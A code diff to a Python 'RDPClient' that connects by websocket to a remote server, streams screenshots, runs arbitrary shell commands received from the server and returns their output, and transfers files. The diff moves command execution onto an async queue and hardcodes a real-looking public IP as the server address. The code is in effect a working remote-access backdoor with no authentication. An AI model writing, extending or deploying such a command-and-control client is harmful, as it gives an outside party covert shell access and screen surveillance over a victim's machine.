@@ -20,6 +20,8 @@ class RDPClient:
         self.screenshot_active = False
         self.screenshot_interval = 0.2
         self.download_path = os.getcwd()
+        self.command_queue = asyncio.Queue()
+        self.file_response_queue = asyncio.Queue()
         
     async def capture_screenshot(self):
         try:
@@ -46,28 +48,31 @@ class RDPClient:
             
         try:
             if platform.system() == 'Windows':
-                result = subprocess.run(
+                process = await asyncio.create_subprocess_shell(
                     command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
                 )
             else:
-                result = subprocess.run(
+                process = await asyncio.create_subprocess_shell(
                     command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
                     executable='/bin/bash'
                 )
-                
-            output = result.stdout if result.stdout else result.stderr
-            return output
             
-        except subprocess.TimeoutExpired:
-            return "Error: Command timeout (30s)"
+            try:
+                stdout, stderr = await asyncio.wait_for(
+                    process.communicate(),
+                    timeout=30
+                )
+                output = stdout.decode() if stdout else stderr.decode()
+                return output
+            except asyncio.TimeoutError:
+                process.kill()
+                await process.wait()
+                return "Command timeout (30s) - process terminated"
+            
         except Exception as e:
             return f"Error: {str(e)}"
     
@@ -78,8 +83,7 @@ class RDPClient:
                 'filename': filename
             }))
             
-            response = await self.websocket.recv()
-            data = json.loads(response)
+            data = await self.file_response_queue.get()
             
             if data['type'] == 'file_data' and data['success']:
                 file_data = base64.b64decode(data['data'])
@@ -98,6 +102,26 @@ class RDPClient:
         except Exception as e:
             return f"Download error: {str(e)}"
             
+    async def command_processor(self):
+        while self.running:
+            try:
+                command = await self.command_queue.get()
+                print(f"Processing command: {command}")
+                
+                output = await self.execute_command(command)
+                
+                await self.websocket.send(json.dumps({
+                    'type': 'command_output',
+                    'command': command,
+                    'output': output,
+                    'timestamp': datetime.now().isoformat()
+                }))
+                
+                self.command_queue.task_done()
+            except Exception as e:
+                print(f"Error processing command: {e}")
+                await asyncio.sleep(0.1)
+    
     async def send_screenshot_loop(self):
         while self.running:
             if self.screenshot_active:
@@ -131,19 +155,11 @@ class RDPClient:
                     
                 elif data['type'] == 'command':
                     command = data['command']
-                    print(f"Executing command: {command}")
-                    
-                    output = await self.execute_command(command)
-                    
-                    await self.websocket.send(json.dumps({
-                        'type': 'command_output',
-                        'command': command,
-                        'output': output,
-                        'timestamp': datetime.now().isoformat()
-                    }))
+                    print(f"Received command: {command}")
+                    await self.command_queue.put(command)
                     
                 elif data['type'] == 'file_data':
-                    pass
+                    await self.file_response_queue.put(data)
                     
         except websockets.exceptions.ConnectionClosed:
             print("Connection closed")
@@ -166,7 +182,8 @@ class RDPClient:
                 
                 await asyncio.gather(
                     self.send_screenshot_loop(),
-                    self.handle_commands()
+                    self.handle_commands(),
+                    self.command_processor()
                 )
                 
         except Exception as e:
@@ -184,7 +201,8 @@ class RDPClient:
             await asyncio.sleep(5)
 
 if __name__ == '__main__':
-    SERVER_URL = "ws://YOUR_IP:3500"
+    """THIS JUST EXMPLE"""
+    SERVER_URL = "ws://13.212.159.35:3500"
     
     client = RDPClient(SERVER_URL)
     asyncio.run(client.start())
